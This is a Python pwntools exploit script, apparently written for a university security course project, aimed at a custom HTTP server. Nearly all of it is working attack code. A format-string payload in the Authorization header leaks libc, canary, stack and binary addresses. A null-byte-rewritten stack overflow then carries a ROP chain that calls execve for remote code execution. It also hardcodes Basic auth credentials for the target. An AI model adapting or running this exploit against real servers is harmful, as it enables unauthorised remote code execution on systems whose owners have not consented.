#!/usr/bin/env python3

from pwn import *
import requests
import base64
import os

elf = ELF("./server")
libc = ELF("./libc.so.6")

context.binary = elf
#context.log_level = 'debug'
context.arch = 'i386'
context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']

def conn():

    if args.LOCAL:

        #gdbscript = """
        #    b main
        #    b post_param
        #    b *post_param+158
        #    b *post_param+302
        #"""
        #r = gdb.debug([elf.path], gdbscript=gdbscript)
        
        r = remote("127.0.0.1", 8321)
    
    else:
        r = remote("project-2.csec.chatzi.org", 8000)

    return r

def leak_addresses(r):

    # We need to make a GET request where we snipe the format string and get the canary
    b64 = base64.b64encode(b'libc.%23$p canary.%27$p buffer.%30$p route()ret.%32$p:hello')

    if args.LOCAL:
        addr = "127.0.0.1:8321"
    else:
        addr = "http://project-2.csec.chatzi.org:8000/"


    # Make a proxy to dry-run the command
    proxy = process(["nc", "-l", "localhost", "8381"])

    # Run curl then close process
    leaks = process(["curl",
        addr,
        "--proxy", "localhost:8381",
        "-H",
        "Authorization: Basic " + b64.decode(),
        "-v"])

    # Fetch the bytestring then close proxy
    request = proxy.clean(1)
    log.info("LEAK REQUEST: " + request.decode('utf-8'))
    leaks.close()
    proxy.close()

    #req = b'GET ' + addr.encode() + b'/ HTTP/1.1\r\n'
    #req += b'Host: ' + addr.encode() + b'\r\n'
    #req += b'User-Agent: noleak\r\n'
    #req += b'Accept: */*\r\n'
    #req += b'Authorization: Basic ' + b64 + b'\r\n'

    # PROCEED
    r.send(request)

    r.recvuntil(b'Invalid user: ')

    # FIRST, THE LIBC LEAK
    r.recvuntil(b'libc.')
    libc_string = r.recv(10)[2:]
    libc_leak = int(libc_string, 16)
    log.info("LIBC LEAK: " + hex(libc_leak))

    # SECOND, CANARY = "%27$p"
    r.recvuntil(b'canary.')
    # Remove the "0x" prefix and get the hex string
    canary_string = r.recv(10)[2:]
    
    # Replace the last two characters with "3d" aka "="
    augmented_canary_string = canary_string[:-2] + b'3d'
    
    # Convert the modified hex string to an integer
    canary_leak = int(augmented_canary_string, 16)
    log.info("CANARY LEAK: " + hex(canary_leak))

    # THIRD, A STACK LEAK CLOSE TO THE BUFFER
    r.recvuntil(b'buffer.')
    buffer_string = r.recv(10)[2:]
    buffer_leak = int(buffer_string, 16)
    
    # modify to reach the buffer, we want to land to the first AAAAs
    buffer_leak -= 108
    log.info("BUFFER LEAK: " + hex(buffer_leak))

    # route ret after check_auth() offset: 194a
    r.recvuntil(b'route()ret.')
    route_string = r.recv(10)[2:]
    route_leak = int(route_string, 16)
    
    # modify to reach the buffer, we want to land to the first AAAAs
    route_leak -= 0x94a
    log.info("ROUTE LEAK: " + hex(route_leak))

    return libc_leak, canary_leak, buffer_leak, route_leak

def transform_null_bytes(bytestring):
    transformed = bytestring.replace(b'\x00', b'\x3d')
    return transformed

# TEDDY picker
def libc_attacker(base, buffer, option):

    # GADGET COLLECTION
    pop_eax = 0x000283e2 + base
    pop_ebp = 0x0001a973 + base
    pop_ebx = 0x0001def6 + base
    pop_edi = 0x0001926d + base
    pop_edx = 0x00031035 + base
    pop_ecx_edx = 0x00031034 + base
    xor_eax = 0x0002ead0 + base
    int_80 = 0x000314a5 + base
    call_eax = 0x0001af15 + base

    if option == 1:
        # PRELUDE
        libc.address = base
        rop = ROP(libc)

        # BLACK MAGIC
        #libc_system = libc.symbols['system']
        #libc_system = 0x41780 + base
        libc_system = 0x411B0 + base

        """
            Dump of assembler code for function system:
            0xf7b45780 <+0>:	endbr32 
            0xf7b45784 <+4>:	call   0xf7c47b41
            0xf7b45789 <+9>:	add    edx,0x1a9877
            0xf7b4578f <+15>:	sub    esp,0xc
            0xf7b45792 <+18>:	mov    eax,DWORD PTR [esp+0x10]
            0xf7b45796 <+22>:	test   eax,eax
            0xf7b45798 <+24>:	je     0xf7b457a8 <system+40>
            0xf7b4579a <+26>:	add    esp,0xc
            0xf7b4579d <+29>:	jmp    0xf7b451b0
            0xf7b457a2 <+34>:	lea    esi,[esi+0x0]
            0xf7b457a8 <+40>:	lea    eax,[edx-0x5cc95]
            0xf7b457ae <+46>:	call   0xf7b451b0
            0xf7b457b3 <+51>:	test   eax,eax
            0xf7b457b5 <+53>:	sete   al
            0xf7b457b8 <+56>:	add    esp,0xc
            0xf7b457bb <+59>:	movzx  eax,al
            0xf7b457be <+62>:	ret    
        """

        # ADDAGGIO
        rop_chain = p32(pop_edi) + p32(buffer) + p32(pop_eax) + p32(libc_system) + p32(call_eax) + p32(buffer)

        #log.info(rop_chain)
        return rop_chain
    
    elif option == 2:
        # CONTRAINTS: eax == NULL && ebp points to the start of the RW section of libc
        libc_one = base + 0x14482b # 2nd output on target libc
        log.info("LIBC ONE: " + hex(libc_one))

        return p32(libc_one)

    elif option == 3:
        """
             /* execve(path='edi', argv=0, envp=0) */
            mov ebx, edi
            xor ecx, ecx     /* arguments */
            xor edx, edx     /* NULL env */
            /* call execve() */
            push SYS_execve /* 0xb */
            pop eax
            int 0x80
        """

        rop_chain = p32(pop_ebx) + p32(buffer)
        rop_chain += p32(pop_ecx_edx) + b'====' + b'===='
        rop_chain += p32(pop_eax) + p32(0xb)
        rop_chain += p32(pop_edi) + b'====' + p32(int_80)

        return rop_chain

def main():
    r = conn()

    sleep(2)

    # Change \x00 to '=' aka \x3d
    #if args.LOCAL:
    #    canary_hex = input("Enter the canary value in hexadecimal format (e.g., 0x12345678): ")
    #    canary = int(canary_hex, 16)
    #    canary &= 0xFFFFFF00  # Clear the last byte
    #    canary |= 0x3D  # Set the last byte to 0x3D
        
    # "Gather round folks" -- Make GET request to leak info on the running server
    libc, canary, buffer, binary_base = leak_addresses(r)

    # GET THY BASE
    elf.address = binary_base
    log.info("SERVER BASE: " + hex(binary_base))

    r.close()

    input("Press [ENTER] to continue...")

    # Calculate libc base
    #if args.LOCAL:
    #    libc_base = libc - 468413 # 725BD -- LOCAL 
    #else:
    libc_base = libc - 451872 # 6E520 -- REMOTE 2.31

    log.info("LIBC BASE: " + hex(libc_base))

    # ONE-SHOT
    libc_one = libc_attacker(libc_base, buffer, 3)

    cmd = b'/usr/bin/lspci='

    # FORMULATE THE PAYLOAD
    payload = b'A' * 12 
    payload += cmd + b'B' * (40 - len(cmd)) # 52 total
    print(cmd)
    print(len(cmd))
    payload += p32(buffer)
    payload += b'C' * 4
    payload += p32(canary)
    
    # This won't work
    #payload += b'C' * 8
    # Instead we will use the start of the libc's RW section,
    # which can be calculated by adding the offset 0x1EB000
    magic_the_gathering = libc_base + 0x1EB000 #voila
    payload += p32(magic_the_gathering) * 2 # 4 bytes each

    payload += b'D' * 4
    payload += libc_one

    payload = transform_null_bytes(payload)

    if args.LOCAL:
        auth_str = "Authorization: Basic dGVzdDowMjk3OTRkYjZlNzZjYjU1OTYxMzczMmQ3Yzk0YjI0YjM2MGJiNmYwNTg3OWJiOTllNzc2NTUxOGI1NWFiYzU3"
        addr = "127.0.0.1:8321"
    else:
        addr = "http://project-2.csec.chatzi.org:8000/"
        auth_str = "Authorization: Basic YWRtaW46OGM2ZTJmMzRkZjA4ZTJmODc5ZTYxZWViOWU4YmE5NmY4ZDllOTZkODAzMzg3MGY4MDEyNzU2N2QyNzBkN2Q5Ng=="

    # Make a proxy to dry-run the command
    #proxy = process(["nc", "-l", "localhost", "8381"])

    # cURL POST Request
    req = process(["curl",
    addr,
    #"--proxy", "localhost:8381",
    "-X", "POST",
    "-H", auth_str,
    "-H", "Content-Length: 0",
    "-d", payload,
    "-v"])

    #request = proxy.clean(1)
    #log.info(request)
    #req.close()
    #proxy.close()

    #r.writeline(request)

    # fetch trash
    #req.recvuntil(b'Fetch the data using `payload` variable.')

    #fetch RCE output
    print(req.clean(1).decode('latin'))

    #r.interactive()


if __name__ == "__main__":
    main()
